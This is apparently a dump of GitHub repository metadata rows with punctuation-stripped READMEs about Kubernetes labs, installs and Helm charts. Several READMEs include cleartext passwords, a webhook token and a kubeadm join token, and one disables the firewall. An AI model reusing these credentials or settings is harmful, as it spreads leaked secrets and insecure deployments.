delete n consul consul The tee a output log command allows stdout to be both written to the terminal and appended to a file simultaneously This is how we keep a copy of all the output we create for later Before you run make install you ll have to run make init to create the required namespaces and install the correct helm repos This is a lab quality consul installation For production hardening please review Secure Consul on K8S https learn hashicorp com tutorials consul kubernetes secure agents Installing Prometheus Grafana We need values files for both of these components helm prometheus values yaml yaml server persistentVolume enabled false alertmanager enabled false We are disabling the alert manager because we re not using it for this lab In a production environment you would want alerts enabled and you would want to configure them to let you know via email slack and other more formal and continuosly monitored channels ServiceNow for example if there is any kind of systemic outage that you need to attend to Also because this is a lab environment we re not going to need to persist prometheus data for later so we re disabling the persistent volume capability helm grafana values yaml yaml adminUser wibble adminPassword pleasechangethispassword IthasbeencommittedincleartexttoGitHut datasources datasources yaml apiVersion 1 datasources name Prometheus type prometheus url http prometheus server access proxy isDefault true service type NodePort targetPort 3000 We have exposed a NodePort to make using the service a little easier and set the admin user and password to a static value to make using it easy Makefile makefile install install consul install prometheus install grafana install prometheus helm install f helm prometheus values yaml prometheus prometheus community prometheus n prograf tee a output log delete prometheus helm delete n prograf prometheus install grafana helm install f helm grafana values yaml grafana grafana grafana n prograf tee a output log delete grafana helm delete n prograf grafana Please change the install target rather than creating a new one You can use kubectl to find grafana s service NodePort and use this to navigate to grafana in a browser You should login and keep the page open as you ll need it soon Demo App Included in the demo app folder are the manifests for a Hashicorp app used for demonstrations hence the name called HashiCup an application that emulates an online order app for a coffee shop For this lab the app includes a React front end a GraphQL API a REST API and a Postgres database Examine the demo app frontend yaml file It contains the following prometheus configuration yaml prometheus io scrape true prometheus io port 9102 We have applied the same config to the other objects resources manifes in the app You ll have to do something similar in your apps if you want the same behaviour This allows Prometheus to discover resources in the K8S cluster that should be exposing metrics data producers and tells Prometheus what port to the metrics are exposed at The proxyDefaults entry in the consul values yaml file that you created earlier along with the envoyprometheusbindaddr 0 0 0 0 9102 is configuring the data consumer sink You configured Consul and Envoy to publish metrics on port 9102 and now you have configured Prometheus to subscribe on each proxy at port 9102 We have deployed this to the default namespace Use kubectl get services to find the port we have exposed the frontend on and navigate to it your browser This will be on localhost if you re running this locally or on your ec2 instance s public ip if you re running in the sandbox You can scroll the coffee cup left and right and pay for it with a mock fingerprint scanner It s not a very complicated app really HashiCup https learn hashicorp com img consul hashicups frontend png Now let s confirm that consul did configure Envoy to publish metrics on port 9102 The Envoy side car proxy can be reached at port 19000 Open a new terminal and issue the following command bash kubectl port forward deploy frontend 19000 19000 Then in a different terminal on the same machine obvs bash curl localhost 19000 configdump jq C less R This should return a really long json file Search it for 9102 there should be 2 entries for it Hint use while viewing the output in less to search for that and you can use j and k like in vim in order to scroll up and down The configuration matches the configuration in the proxyDefaults entry in the consul values yaml file This shows that Consul has configured Envoy to publish Prometheus metrics You can stop the port forwarder now ctrl c Simulate Traffic We have a tool also from Hashi that will generate traffic for the HashiCup application Strangely enough this is called Traffic Don t confuse this with Traefik the ingress controller that ships by default with K3S as they are totally different things If you change to the branch traffic you ll find a new file in the root called traffic yaml It s too long to post here so I ve just given it to you to use directly When you apply this file to kubernetes it will immediately start exercising the components of the demo app to generate traffic that we can monitor with Consul Prometheus and Grafana Lies Damn Lies and Statistics Envoy exposes a huge amount of metrics Which ones you want to see is an application and task specific issue For now we have preconfigured a Grafana dashboard with a couple of basic metrics but you should systematically consider what others you will need to collect as you move from testing into production You ll find the grafana dashboard spec in the file hashicups dashboard json also in the traffic branch You can go back to the grafana tab in your browser now Hit the big symbol on the left and select import then hit the big blue Upload JSON file button and select the hashicups dashboard json we mentioned at the top of this paragraph Alternatively you might get away with pasting the contents of that file in the tiny little text box they ve provided for lamers who can t download upload a file Retrospective In this lab you set up layer 7 metrics collection and visualization in a Kuberenetes cluster using Consul service mesh Prometheus and Grafana all deployed via Helm charts Specifically you 1 Configured Consul and Envoy to expose application metrics to Prometheus 2 Deployed Consul using the official helm chart 3 Deployed Prometheus and Grafana using their official Helm charts 4 Deployed a multi tier demo application that was configured to be scraped by Prometheus 5 Started a traffic simulation deployment and observed the metrics in Grafana Lab Extension Nginx Ingress controller The Nginx ingress controller is perhaps the most popular in the inudstry You re going to add it to this application to expose the Grafana dashboard The nginx branch has the necessary files Unlike the previous half of the lab you re not getting any more help with this one I have provided the nginx installation commands in the makefile and a values file that you can get started with I will give you 2 clues though you can google for the answer and bash helm show values ingress nginx ingress nginx,2020-09-15T20:59:34Z,2020-09-16T10:04:56Z,n/a,Organization,1,1,4,0,master,,0,0,0,0,0,0,0
JorgeReus,k8s-user-auth,,k8s user auth Repo for demoing k8s user authentication with 3 different methods 1 CSR Certificate signing request 2 Webhook Token 3 OIDC OpenId Connect This repo is meant to be the labs from https medium com roibak1170 vanilla kubernetes user authentication and authorization in depth b26ec2626734,2020-09-02T02:02:33Z,2020-11-17T10:14:54Z,Go,User,1,1,3,10,master,JorgeReus#onurg#onur-gokkocabas-globant,3,0,0,0,0,0,1
k8-proxy,p-ui-wireframes,,p ui wireframes CI https github com k8 proxy p ui wireframes workflows CI badge svg CD https github com k8 proxy p ui wireframes workflows CD badge svg This repo is split into three main sections Wireframes Designs for the Management Portal on the Glasswall ICAP project design A Prototype management portal made with React and React Typescript server A Prototype management portal server backend made in Node js and Typescript proto app Requirements See the Wiki page https github com k8 proxy p ui wireframes wiki Requirements for the full list of requirements from the SOW document,2020-09-09T09:40:54Z,2020-12-21T07:50:26Z,JavaScript,Organization,11,1,3,282,develop,olegtaranenko#werzl#kerempg#dtollaku#mahnouman,5,14,17,7,23,0,60
cyrilsebastian1811,Users-S3-Bucket-Operator,aws-iam#aws-s3#docker#golang#k8s#kubernetes-operator#olm#operator-sdk,A Kubernetes operator built using operator sdk,2020-09-18T05:03:35Z,2020-09-18T06:11:00Z,Go,User,1,1,0,9,master,suhas1602,1,0,0,0,0,0,0
keepwalking86,k8s,,,2020-12-23T04:16:07Z,2020-12-29T07:12:23Z,n/a,User,1,1,0,3,master,keepwalking86,1,0,0,0,0,0,0
jamshidyerzakov,k8s,,k8s Here you can find my custom k8s configs for some tools,2020-11-28T11:28:19Z,2020-12-08T10:27:22Z,n/a,User,1,1,0,6,main,jamshidyerzakov,1,0,0,0,0,0,0
sala19,k8s,,,2020-11-02T21:23:21Z,2020-11-02T21:38:52Z,n/a,User,1,1,0,0,master,,0,0,0,0,0,0,0
Enzo-J,K8S,,,2020-12-15T08:10:12Z,2020-12-22T09:35:53Z,Java,User,2,1,1,86,master,xingpengwang#DangWe#chfchfchf#Velik123,4,0,0,0,0,0,0
erdembas,k8s,,,2020-11-16T11:03:59Z,2020-12-04T09:37:29Z,n/a,User,1,1,0,1,main,erdembas,1,0,0,0,0,0,0
yonnyviz,k8s,,k8s automation tool Wrapper scripts for deploying a k8s cluster Prerequisites A Google Cloud Platform account A configured gcloud SDK A system with Docker installed A system with Terraform installed A system with kubectl installed How to Use Cluster Creation Creates GKE clusted by passing a GCP Service Account key file k8s create f key file path d dockerfile folder path n app name example k8s sh create f key file json d apps hello python n mypythonapp Cluster Destruction Destroy GKE clusted by passing a GCP Service Account key file k8s destroy f gcp credential file path Pending tasks to do x Implement GKE Ingress Control x Fix python rest api greeting respone x Fix python rest api square respone x Fix python rest api square respone,2020-12-21T09:59:50Z,2020-12-21T15:55:18Z,Shell,User,1,1,0,4,master,yonnyviz,1,0,0,3,0,0,5
bosstips,k8s,,k8s,2020-11-06T07:58:40Z,2020-11-16T12:12:56Z,Shell,User,1,1,0,1,main,bosstips,1,0,0,0,0,0,0
goupiN008,K8s,,Standalone Kubernetes Installation Manual Component Kubernetes 1 13 12 kubeadm 1 13 12 kubelet 1 13 12 kubernetes cni 0 7 5 Docker CE 19 03 5 calico 3 3 Ubuntu 18 04 3 LTS VMs 1 VM for Kubernetes 1 Install Docker and Kubernetes for all workers and masters Run command as root user Apply these steps to all master and worker nodes 1 1 Base Prerequisite Update DNS shell mv etc resolv conf etc resolv conf org printf nameserver 127 0 0 53nnameserver 8 8 8 8n etc resolv conf cat etc resolv conf Change Time Zone shell timedatectl set timezone Asia Bangkok date Define proxy if needed shell echo export httpproxy etc bash bashrc echo export httpsproxy etc bash bashrc echo export noproxy etc bash bashrc echo export httpproxy etc environment echo export httpsproxy etc environment Turn off swap Permanently disable swap shell swapoff a sed e swap s i etc fstab Update your base system with the latest available packages shell sudo apt get update Disable Firewall shell apt get install ufw ufw disable systemctl disable ufw 1 2 Install docker Setup Proxy for Docker shell mkdir etc systemd system docker service d echo Service etc systemd system docker service d http proxy conf echo Environment httpproxy etc systemd system docker service d http proxy conf echo Environment httpsproxy etc systemd system docker service d http proxy conf echo Environment noproxy etc systemd system docker service d http proxy conf Turn on Json file configuration shell mkdir p etc docker echo etc docker daemon json echo bip 10 200 1 1 16 etc docker daemon json echo default address pools etc docker daemon json echo etc docker daemon json echo base 10 200 0 0 16 etc docker daemon json echo size 16 etc docker daemon json echo etc docker daemon json echo etc docker daemon json echo log driver json file etc docker daemon json echo log opts etc docker daemon json echo max size 5m etc docker daemon json echo max file 1 etc docker daemon json echo etc docker daemon json echo etc docker daemon json Install required packages to add Docker repository shell apt get y install apt transport https ca certificates curl software properties common Download and add Dockers GPG key shell curl fsSL https download docker com linux ubuntu gpg apt key add Add Docker repository shell add apt repository deb arch amd64 https download docker com linux ubuntu lsbrelease cs stable Update the repository shell apt get update apt cache showpkg docker ce Install Docker shell apt get y install docker ce 5 19 03 5 3 0 ubuntu bionic docker version Add your username to the docker group to avoid sudo shell usermod aG docker root usermod aG docker ubuntu 1 4 Install Kubernetes Download and GPG key shell curl s https packages cloud google com apt doc apt key gpg apt key add Add Kubernetes repository shell echo deb http apt kubernetes io kubernetes xenial main sudo tee etc apt sources list d kubernetes list Update the repository shell cd tmp curl LO https storage googleapis com kubernetes release release v1 13 12 bin linux amd64 kubectl echo deb https packages cloud google com apt kubernetes xenial main sudo tee etc apt sources list d kubernetes list chmod x kubectl mv kubectl usr local bin kubectl apt get update y Install Kubernetes shell yes Y apt get install kubeadm 1 13 12 00 kubelet 1 13 12 00 kubectl 1 13 12 00 kubernetes cni 0 7 5 00 3 Initialize the Master Node Run command as root user Initialize Master shell kubeadm init ignore preflight errors all Copy the kubeadm join command line printed as the result of the previous command for other Masters and Workers to join the cluster in step 3 4 and 6 as example below shell kubeadm join 172 31 115 113 6443 token kkjdt2 b24hf6269e4ruyaz discovery token ca cert hash sha256 3cd9489da728c9306e1f7a979ed936e73ae15cd74fa04b6a58bb3e6bfad58c98 4 Move kube configuration files Run command as ubuntu user Apply this step to all Master nodes shell mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config 5 Apply CNI Network Run command as ubuntu user Apply this step to any Master node shell kubectl apply f https docs projectcalico org v3 3 getting started kubernetes installation hosted rbac kdd yaml kubectl apply f https docs projectcalico org v3 3 getting started kubernetes installation hosted kubernetes datastore calico networking 1 7 calico yaml 6 Join the Cluster for Worker nodes Run command as root user Apply this step to all Worker nodes Paste the kubeadm join command line printed as the result of the 3 1 step shell,2020-11-04T07:09:02Z,2020-11-18T04:49:20Z,n/a,User,1,1,0,2,main,goupiN008,1,0,0,0,0,0,0
subicura,k8s,k8s#kubernetes,,2020-12-13T18:44:06Z,2020-12-28T02:39:39Z,Vue,User,1,1,0,60,master,subicura,1,0,0,0,0,0,0
zhaofa2014,k8s,,,2020-09-11T05:55:09Z,2020-09-26T05:56:14Z,n/a,User,1,1,0,0,master,,0,0,0,0,0,0,0
mouse9527,k8s,,,2020-11-11T09:07:55Z,2020-12-24T10:03:06Z,Shell,User,1,1,0,0,master,,0,0,0,0,0,0,0
arrow2012,k8s_install,,k8sinstall,2020-09-09T06:53:40Z,2020-09-09T08:08:27Z,Go,User,1,1,0,0,master,,0,0,0,0,0,0,0
rodtin,k8s_udemy,,Repositorio de backup kubernetes by rodtin gmail com k8sudemy,2020-11-05T22:58:07Z,2020-12-14T23:11:21Z,HTML,User,1,1,0,7,main,rodtin,1,0,0,0,0,0,0
zgw1469039806,notebook,,,2020-08-28T09:06:13Z,2020-09-02T11:53:33Z,HTML,User,1,1,0,2,master,zgw1469039806,1,0,0,0,0,0,0
cyrilsebastian1811,Recipe-Management-System-Helm-Charts,docker#helm-charts#jenkins,Team information Team Members Github Id NUID Suhas Pasricha suhas1602 001434745 Puneet Tanwar puneetneu 001409671 Cyril Sebastian cyrilsebastian1811 001448384 Shubham Sharma shubh1646 001447366 Description This is a repository to store helm charts that deploy the backend and frontend of our application on a kubernetes cluster Backend chart install helm install backend webapp backend n api set dbUser team dbPassword Qwerty123 imageCredentials username imageCredentials password rdsEndpoint dockerImage s3Bucket awsAccess awsSecret redis global redis password Yhbvft123 domainName uninstall helm uninstall backend n api Frontend chart install helm install frontend webapp frontend n ui set imageCredentials username imageCredentials password internalBackendService lb backend api dockerImage backendServiceEndpoint domainName uninstall helm uninstall frontend n ui Goapp chart install helm install goapp webapp goapp n time set imageCredentials username imageCredentials password dockerImage domainName uninstall helm delete goapp n time Jenkins Plugins to be Installed 1 GitHub Integration 2 Kubernetes CLI 3 Kubernetes 4 SSH Agent 5 Generic Webhook Trigger Global Credentials 1 dockerhubcredentials type Username and Password Username cyrilsebastian1811 Password xxxxxxxxxx 2 dbcredentials type Username and Password Username team Password Qwerty123 2 github ssh SSH Username github Private Key contents of cyrilwork from local 3 kubernetescredentials Username and Password Username admin Password kube config users password base64 Configure System 1 Manage Jenkins Configure System Cloud Kubernetes Kubernetes server certificate key kube config clusters certificate authority data base64decode Credentials kubernetescredentials 2 Manage Jenkins Configure System Git plugin Global Config user name Value Jenkins Configuration for Pipeline Build Triggers 1 Generic Webhook Trigger Token QAZwsx123 Strig Parameters 1 GITURL git github com cyrilsebastian1811 webapp backend git 2 GITBRANCH a8 3 S3BUCKETURL webapp dev cyril sebastian com 4 RDSENDPOINT csye7374 db cz6rkkjdva3j us east 1 rds amazonaws com 5 KUBERNETESAPI https api k8 dev cyril sebastian com 6 DOMAINNAME dev cyril sebastian com Password Parameters 3 AWSACCESSKEYID xxxxxxxxxxxxxxx 4 AWSSECRETACCESSKEY xxxxxxxxxxxxxxx 5 REDISPSW Yhbvft123,2020-09-18T05:10:20Z,2020-09-18T06:11:04Z,Smarty,User,1,1,0,60,master,cyrilsebastian1811#suhas1602#puneetneu,3,0,0,0,0,0,0
jota-equis,dock8s,bash-hacks#docker#dockerfile#hardening#k8s#kubernetes#kubernetes-cluster#kubernetes-deployment,dock8s Hardened docker files and kubernetes deployments on steroids,2020-11-17T02:37:01Z,2020-12-16T04:56:50Z,Shell,User,1,1,0,116,master,jota-equis,1,1,1,0,0,0,16
KennyChenFight,K8S-Tutorial,,K8S Tutorial Blog Kubernetes https blog kennycoder io categories Kubernetes,2020-12-23T07:33:03Z,2020-12-23T10:00:24Z,Go,User,1,1,0,3,main,KennyChenFight,1,0,0,0,0,0,0
ilkerispir,k8s-microservice,,k8s microservice Get Kubernetes Cluster gcloud container clusters get credentials demo cluster zone europe west4 project ilkerispir Architecture k8s microservice architecture png,2020-10-27T14:25:18Z,2020-11-17T08:58:04Z,n/a,User,1,1,0,1,main,ilkerispir,1,0,0,0,0,0,0
k8s-bhyve,k8s-mq-api,,k8s mq api k8s mq api simple demo sample for CBSD K8S API,2020-12-11T12:14:37Z,2020-12-28T11:57:51Z,Go,Organization,1,1,0,5,main,olevole,1,0,0,0,0,0,0
camsjams,rust-fullstack-docker-k8s,,rustfullstackdockerk8s Rust Fullstack Docker K8s Rust Fullstack Application running on Docker and Kubernetes Version See Cargo toml Cargo toml version Demo See live demo here https fullstack cameronmanavian com Walkthrough This repo and accompanying information will be presented at RustLab 2020 https www rustlab it agenda session 330894 Platforms Technologies Rust https www rust lang org en US Cargo https doc rust lang org cargo Actix https actix rs Docker https www docker com Kubernetes https kubernetes io MeiliSearch https www meilisearch com Okteto https okteto com Build cd app cd npm run build cd cargo build Run cargo run Deploy to K8s on GKE scripts build sh scripts deploy gke sh,2020-10-10T05:08:35Z,2020-10-17T13:08:06Z,Rust,User,1,1,0,21,main,camsjams,1,0,0,0,0,0,0
mdelplato,k8s-test-proj,,,2020-12-04T13:30:07Z,2020-12-04T13:52:13Z,Shell,User,1,1,0,3,main,mdelplato,1,0,0,0,0,0,0
BlueBambooStudios,hcloud-connect,,Hetzner Cloud Connect golangci lint https github com BlueBambooStudios hcloud connect workflows golangci lint badge svg Docker https github com BlueBambooStudios hcloud connect workflows Docker badge svg Handles automatically adding servers to load balancers Usage All configuration is passed with environment variables We recommend storing these variables as secrets First create a secret containing your hetzner credentials apiVersion v1 kind Secret metadata name hcloud namespace kube system type Opaque stringData token HETZNERAPITOKEN loadBalancer LOADBALANCERID Then deploy the daemonset to your cluster kubectl apply f https raw githubusercontent com BlueBambooStudios hcloud connect master deployment daemonset yaml Environment variables Key Type Default Description HCLOUDTOKEN String Hetzner API token HCLOUDENDPOINT String Optional Optional endpoint URL for Hetzner Cloud HCLOUDDEBUG Boolean Optional FALSE Enable debug loggin HCLOUDLOADBALANCER String Load balancer id HCLOUDUSEPRIVATENETWORK Boolean Optional FALSE Use the private network when attaching targets NODENAME String Node name as shown in Hetzner control panel N B There are no tests use at your own peril,2020-09-20T21:51:08Z,2020-10-16T16:06:36Z,Go,Organization,1,1,0,11,master,haswalt,1,0,1,0,0,0,0
KimKiHyuk,airflow-dags,,Airflow settings repository requirements k8s helm bitnami commands install package pip install r requirements txt install k8s https docs microsoft com ko kr azure aks kubernetes walkthrough install airflow on k8s helm install cluster f airflow dags airflow yaml bitnami airflow upgrade airflow on k8s helm upgrade cluster f airflow dags airflow yaml bitnami airflow port foward airflow web ui kubectl port forward namespace default svc cluster airflow 8080 8080 How to throw custom ENV like awsaccesstoken 0 create env 1 Modify it https github com KimKiHyuk airflow dags blob 4aa042d2c1b47be9683427987ca935c291f6ca5a airflow yaml L323 2 Use it in airflow import os print os envrion AIRFLOWAWSSECRET hallym scripts runemr py add net spark step to emr remotely,2020-11-18T18:00:53Z,2020-12-29T06:51:45Z,Python,User,1,1,0,50,master,KimKiHyuk,1,0,0,0,0,0,0
fenix-sap,k8s_image_scanner,,,2020-10-12T12:38:13Z,2020-10-13T09:57:32Z,Python,User,1,1,0,7,main,fenix-sap,1,0,0,0,0,0,0
w-son,Kubernetes,,Kubernetes Kubernetes Container Orchestration OpenSource Scalability high performance High Availability no downtime Disaster Recovery backup and restore Kubernetes Amigoscode https www youtube com user djdjalas Kubernetes https kubernetes io ko docs tutorials Contents 1 VM vs Container docs container md 2 Basic Architecture docs architecture md 3 Components docs components md 4 Minikube and Kubectl docs mk md Tutorials 1 Setting up Environments docs environments md 2 Deployments and Pods docs dp md 3 Secret and ConfigMap docs sc md Build Docker images docs docker md,2020-10-10T14:34:52Z,2020-11-08T08:06:34Z,Dockerfile,User,1,1,0,15,master,w-son,1,0,0,0,0,0,0
yvak90,KubernetesZone,,,2020-11-15T17:57:49Z,2020-11-18T18:06:26Z,n/a,User,1,1,0,27,master,yvak90,1,0,0,0,0,0,0
Samze,cf-for-k8s-terraform,,Creates a cf for k8s env on GKE using terraform How to use To install 1 Login with gcloud auth application default login 1 Edit example tfvars json with your GCP values Changing at a minimum envname envdnsdomain region zone 1 Run create sh config tfvars json To cleanup 1 terraform destroy var file config tfvars json state state envname tfstate terraform Required CLI dependencies cf v7 only terraform bosh kapp ytt gcloud Notes Terraform modified from https github com cloudfoundry cf for k8s tree master deploy gke terraform,2020-09-08T16:04:42Z,2020-10-02T12:19:14Z,HCL,User,1,1,0,7,master,Samze,1,0,0,0,0,0,0
Pandemonium1986,ansible-collection-k8s-toolbox,ansible-collection#automation#k8s,Ansible Collection k8s toolbox Ansible Collection https img shields io badge collection pandemonium1986 k8stoolbox blue logo ansible GitHub release https img shields io github release Pandemonium1986 ansible collection k8s toolbox svg logo github Github license https img shields io github license Pandemonium1986 ansible collection k8s toolbox svg logo github pre commit https img shields io badge pre commit enabled brightgreen logo pre commit logoColor white https github com pre commit pre commit This Ansible Collection https docs ansible com ansible latest userguide collectionsusing html k8s toolbox contains roles and playbooks to deploy and configured tools to managed a kubernetes cluster Getting Started This collection contains the following ressources Ressources Comment Privilege CI Status roles helm https github com pandemonium1986 ansible role helm Install helm from the github package and make a symbolic link in usr local bin true Github pipeline status https github com Pandemonium1986 ansible role helm workflows Molecule 20Github 20actions 20pipeline badge svg roles k9s https github com pandemonium1986 ansible role k9s Install k9s from the github package and make a symbolic link in usr local bin true Github pipeline status https github com Pandemonium1986 ansible role k9s workflows Molecule 20Github 20actions 20pipeline badge svg roles kubectl https github com pandemonium1986 ansible role kubectl Install kubectl from google repositories centos or debian supported true Github pipeline status https github com Pandemonium1986 ansible role kubectl workflows Molecule 20Github 20actions 20pipeline badge svg roles kubectx https github com pandemonium1986 ansible role kubectx Install kubectx kubens from the github package and make a symbolic link in usr local bin true Github pipeline status https github com Pandemonium1986 ansible role kubectx workflows Molecule 20Github 20actions 20pipeline badge svg roles minikube https github com pandemonium1986 ansible role minikube Install minikube from google repositories centos or debian supported true Github pipeline status https github com Pandemonium1986 ansible role minikube workflows Molecule 20Github 20actions 20pipeline badge svg roles stern https github com pandemonium1986 ansible role stern Install stern from the github package and make a symbolic link in usr local bin true Github pipeline status https github com Pandemonium1986 ansible role stern workflows Molecule 20Github 20actions 20pipeline badge svg Prerequisites The only prerequisite is to have an Ansible https docs ansible com ansible latest installationguide index html 2 9 Installing sh ansible galaxy collection install pandemonium1986 k8stoolbox Deployment There are no specific prerequisites for the use of the collection Simply create a playbook that may be briefly similar to this one yaml name K8s Toolbox deployement hosts local become true collections pandemonium1986 k8stoolbox tasks importrole name pandemonium1986 minikube importrole name pandemonium1986 kubectx importrole name pandemonium1986 k9s importrole name pandemonium1986 stern importrole name pandemonium1986 helm Available variables are yaml helmcachepath var cache github helminstallationpath opt github helm helmchecksum sha256 b664632683c36446deeb85c406871590d879491e3de18978b426769e43a1e82c helmversion v3 3 4 k9scachepath var cache github k9sinstallationpath opt github k9s k9schecksum sha256 42d8aef6b839a9bc60de29d2461521596ce2d1f66347dbf5196983229cfeafd2 k9sversion v0 22 1 kubectxpath opt github kubectxversion master sterninstallationpath opt github stern sternchecksum sha256 e0b39dc26f3a0c7596b2408e4fb8da533352b76aaffdc18c7ad28c833c9eb7db sternversion 1 11 0 Contributing Pre commit I use pre commit to manage the commit msg commit and pre push hooks To install the hooks proceed as follows sh pre commit install hook type commit msg pre commit install hook type pre push pre commit install Monorepo The ansible collections are composed of a set of roles plug ins modules My choice was made to group all the roles in a monorepo the collection itself and to ensure the building of the roles in manyrepo This section is not only aimed at the collection itself but potentially at all of them First of all if you start from a set of roles existing in manyrepo you have to group them in the roles directory of the collection I use tomono https github com hraban tomono to create the monorepo from the manyrepos To generate the monorepo folder assuming that the user pandemonium exists and his homedir is home pandemonium sh mkdir p git Pandemonium1986 ansible collection k8s toolbox git init git clone https github com hraban tomono git git github hraban tomono vim Documents workspace repos txt git github com Pandemonium1986 ansible role helm ansible role helm roles helm git github com Pandemonium1986 ansible role k9s ansible role k9s roles k9s git github com Pandemonium1986 ansible role kubectl ansible role kubectl roles kubectl git github com Pandemonium1986 ansible role kubectx ansible role kubectx roles kubectx git github com Pandemonium1986 ansible role minikube ansible role minikube roles minikube git github com Pandemonium1986 ansible role stern ansible role stern roles stern export MONOREPONAME home pandemonium git Pandemonium1986 ansible collection k8s toolbox cd cat Documents workspace repos txt home pandemonium git github hraban tomono tomono sh continue To ensure the synchronisation of the manyrepos from the monorepo I use splitsh lite https github com splitsh lite An example of repo helm synchronisation sh cd git Pandemonium1986 ansible collection k8s toolbox SHA1 splitsh lite prefix roles ansible role helm git push ansible role helm SHA1 refs heads CURRENTBRANCH f no verify Each role can be tested independently via molecule Authors Michael Maffait Initial work Pandemonium1986 https github com Pandemonium1986 License This project is licensed under the MIT License see the LICENSE LICENSE file for details,2020-10-05T22:18:08Z,2020-11-18T08:19:42Z,Shell,User,1,1,0,108,master,Pandemonium1986,1,1,2,0,0,0,6
JamesClonk,k8s-infrastructure,hetzner-cloud#k3s#kapp#kbld#kubernetes#kubernetes-cluster#vendir#ytt,k8s infrastructure Create your own personal Kubernetes infrastructure the quick and easy way Quick start bash get this repository here git clone https github com JamesClonk k8s infrastructure cd k8s infrastructure adjust at minimum the following variables HCLOUDTOKEN HETZNERPUBLICSSHKEY INGRESSDOMAIN INGRESSBASICAUTHUSERNAME INGRESSBASICAUTHPASSWORD LETSENCRYPTEMAILADDRESS vi configuration env sh provision Kubernetes on Hetzner Cloud with CSI driver for persistent volumes and install these basic tools and software ingress nginx cert manager dashboard prometheus loki grafana postgres deploy sh configure DNS provider entries with loadbalancer floating or server ip A INGRESSDOMAIN IP CNAME INGRESSDOMAIN INGRESSDOMAIN What is this This is a collection of scripts for a fully automated deployment of Kubernetes onto a Hetzner Cloud https www hetzner com cloud virtual machine It will use the Hetzner Cloud CLI to create a single VM deploy K3s https k3s io onto it target the newly installed Kubernetes and deploy various additional components The whole deployment process is entirely automated and idempotent and can also run automatically via the included github workflows Installation Installation There s nothing to install here Just run the steps as mentioned above in Quick start and off you go your very own personal Kubernetes cluster will be deployed on Hetzner Cloud Configuration The provided default configuration inside configuration env sh is aimed at provisioning and using a type CX31 or higher Hetzner Cloud virtual machine with at least 4 CPUs and 8GB of memory You will have to modify at least the following variables before you can provision your own Kubernetes cluster on Hetzner Cloud HCLOUDTOKEN HETZNERPUBLICSSHKEY INGRESSDOMAIN INGRESSBASICAUTHUSERNAME INGRESSBASICAUTHPASSWORD LETSENCRYPTEMAILADDRESS A CX31 costs 10 per month and is billed hourly which makes it a very cheap and super convenient option for testing purposes If you want to use a lower spec machine then you should also adjust resource values for some of the included components mainly to reduce their memory footprint To do so simply go through each subdirectory and check their respective values yml if it contains a resources section you can adjust the values there postgres Adjust postgres resources memoryinmb to 256 for a minimal database sizing You can disable the periodic backups by setting pgbackup enabled to false as each backup job can consume up to 1GB of memory while it is running You can also configure the backup jobs maximum memory consumption via pgbackup resources memoryinmb though decreasing this value too much will cause the backup to fail and crash if it runs out of memory while creating a database dump prometheus Adjust prometheus resources requests limits to lower values to reduce maximum memory usage Be careful not to set the limits too low prometheus server can crash easily due to running out of memory while running some heavy metrics queries against it Architecture Kubernetes docs architecture png Components Name Description URL K3s https k3s io An easy to install lightweight fully compliant Kubernetes distribution packaged as a single binary https github com rancher k3s NGINX Ingress Controller https kubernetes github io ingress nginx An Ingress controller for Kubernetes using NGINX as a reverse proxy and load balancer https github com kubernetes ingress nginx cert manager https cert manager io Automatic certificate management on top of Kubernetes using Let s Encrypt https letsencrypt org https github com jetstack cert manager Kubernetes Dashboard https kubernetes io docs tasks access application cluster web ui dashboard General purpose web UI for Kubernetes clusters https github com kubernetes dashboard kube state metrics https github com kubernetes kube state metrics Add on agent to generate and expose cluster level metrics https github com kubernetes kube state metrics Prometheus https prometheus io Monitoring alerting system and time series database for metrics https github com prometheus Loki https grafana com oss loki A horizontally scalable highly available multi tenant log aggregation system https github com grafana loki Grafana https grafana com grafana Monitoring and metric analytics dashboards for Prometheus and Loki https github com grafana grafana PostgreSQL https www postgresql org The world s most advanced open source relational database https www postgresql org docs Tools Name Description URL Hetzner Cloud https www hetzner com cloud Command line interface for interacting with Hetzner Cloud https github com hetznercloud cli kapp https get kapp io Deploy and view groups of Kubernetes resources as applications Carvel https carvel dev formerly https k14s io ytt https get ytt io Template and overlay Kubernetes configuration via YAML structures Carvel https carvel dev formerly https k14s io vendir https github com vmware tanzu carvel vendir Declaratively state what files should be in a directory Carvel https carvel dev formerly https k14s io kbld https get kbld io Seamlessly incorporates image building pushing and resolution into deployment workflows Carvel https carvel dev formerly https k14s io kapp controller https github com vmware tanzu carvel kapp controller Kubernetes controller for Kapp provides App CRDs Carvel https carvel dev formerly https k14s io k9s https k9scli io Terminal UI to interact with your Kubernetes clusters https github com derailed k9s Thoughts considerations Why not using operators Well this is meant to be used for a single user Kubernetes cluster whether with only a one or multiple nodes self deployed or managed While operators are certainly cool pieces of software they don t really make much sense for a single user scenario hence I saw no reason to use the prometheus grafana and postgres operators for those parts of this Kubernetes infrastructure as code project Why using simple basic auth for all ingresses I was considering and experimenting with using oauth2 proxy https github com oauth2 proxy oauth2 proxy and authelia https github com authelia authelia but ultimately made the same decision as with regards to using operators It simply doesn t make much sense for a single user Kubernetes cluster the engineering and operational overhead was not worth it All I needed are static username password credentials for securing my applications My recommendation would be to use one of these two if you have more requirements than me https github com oauth2 proxy oauth2 proxy Simple oauth2 proxy to be used with GitHub for example https github com authelia authelia Allows sophisticated auth configuration 2FA etc Both can be configured easily to work well together with ingress nginx,2020-10-31T20:48:16Z,2020-12-17T17:33:40Z,Shell,User,1,1,0,163,master,JamesClonk,1,0,0,0,0,0,0
iHUAYU,docker-images,,,2020-10-28T06:59:52Z,2020-10-28T07:09:30Z,n/a,User,1,1,0,1,main,iHUAYU,1,0,0,0,0,0,0
fedor-chemashkin,polytech-k8s-lab,,polytech k8s lab polytech k8s lab,2020-10-05T20:29:08Z,2020-11-23T14:40:14Z,n/a,User,1,1,1,3,main,fedor-chemashkin#grih9#safronovD,3,0,0,0,0,0,2
fwt11,redis-sentinel-k8s,,redis sentinel k8s redis sentinel for k8s Usage bash git clone https github com fwt11 redis sentinel k8s git cd redis sentinel k8s kubectl apply k the cluster will run y default there is only one master all they other pod in the redis statefulset are replicasIf you want to add another master just copy redis yam then modify the statefulset s name create that statefulset redis test yaml is an example Maybe you need to modify nfs volume yaml,2020-08-26T06:14:40Z,2020-08-26T10:58:41Z,n/a,User,1,1,0,7,master,fwt11,1,0,0,0,0,0,0
